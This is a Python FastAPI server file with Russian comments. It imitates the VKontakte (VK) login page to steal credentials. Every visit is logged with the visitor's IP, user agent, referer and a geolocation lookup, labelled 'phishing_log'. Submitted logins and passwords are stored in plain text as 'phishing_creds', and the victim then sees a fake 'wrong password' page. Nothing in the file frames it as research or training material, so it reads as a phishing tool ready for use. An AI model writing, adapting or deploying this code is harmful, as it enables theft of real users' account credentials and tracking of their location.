from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
import datetime
import json
import db

app = FastAPI()

@app.get("/log")
async def log_get(request: Request):
    # Собираем базовые данные (IP, User-Agent, реферер) при заходе
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "unknown")
    referer = request.headers.get("referer", "none")
    geo = {}
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{client_ip}?fields=country,regionName,city,isp", timeout=5) as resp:
                geo = await resp.json()
    except:
        pass
    log_data = {
        "ip": client_ip,
        "user_agent": user_agent,
        "referer": referer,
        "geo": geo,
        "time": datetime.datetime.now().isoformat()
    }
    db.add_log(user_id=0, action="phishing_log", query=client_ip, result=json.dumps(log_data, ensure_ascii=False))

    # Отдаём HTML-страницу с формой
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Вход в ВК</title>
        <style>
            body { background: #e5ebf1; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); width: 360px; }
            .login-box img { display: block; margin: 0 auto 20px; width: 80px; }
            .login-box h2 { text-align: center; color: #2c3e50; }
            .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
            .login-box button { width: 100%; padding: 10px; background: #4a76a8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
            .login-box button:hover { background: #3a5f85; }
            .error { color: red; text-align: center; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://vk.com/images/icons/favicons/favicon_vk_256.ico" alt="VK">
            <h2>Вход в ВКонтакте</h2>
            <form action="/log" method="POST">
                <input type="text" name="login" placeholder="Телефон или email" required>
                <input type="password" name="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>
            <div class="error">⚠️ Если у вас проблемы со входом, попробуйте позже.</div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html, status_code=200)

@app.post("/log")
async def log_post(login: str = Form(...), password: str = Form(...), request: Request = None):
    # Сохраняем введённые данные
    client_ip = request.client.host if request else "unknown"
    log_entry = {
        "login": login,
        "password": password,
        "ip": client_ip,
        "time": datetime.datetime.now().isoformat()
    }
    db.add_log(user_id=0, action="phishing_creds", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))
    # Возвращаем страницу с ошибкой (имитация)
    html = """
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>Ошибка</title></head>
    <body style="background:#e5ebf1;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;">
        <div style="background:white;padding:40px;border-radius:10px;text-align:center;">
            <h2 style="color:red;">Неверный логин или пароль</h2>
            <p>Пожалуйста, попробуйте снова.</p>
            <a href="/log">Вернуться на страницу входа</a>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html, status_code=200)
